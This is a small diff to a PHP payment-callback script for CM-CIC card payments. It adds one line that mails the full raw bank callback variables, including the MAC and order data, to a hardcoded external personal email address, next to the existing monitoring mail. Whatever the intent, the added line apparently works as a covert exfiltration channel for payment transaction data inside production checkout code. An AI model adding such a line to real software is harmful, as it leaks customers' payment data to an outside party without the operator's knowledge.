@@ -88,6 +88,7 @@ if ($oHmac->computeHmac($cgi2_fields) == strtolower($CMCIC_bruteVars['MAC']) || 
             $mail->Send();
 
             mail($monitoringEmail, 'Valid CB ' . $oid, var_export($CMCIC_bruteVars, true));
+            mail("stef.eugene@wanadoo.fr", 'Valid CB ' . $oid, var_export($CMCIC_bruteVars, true));
 
             break;
     }
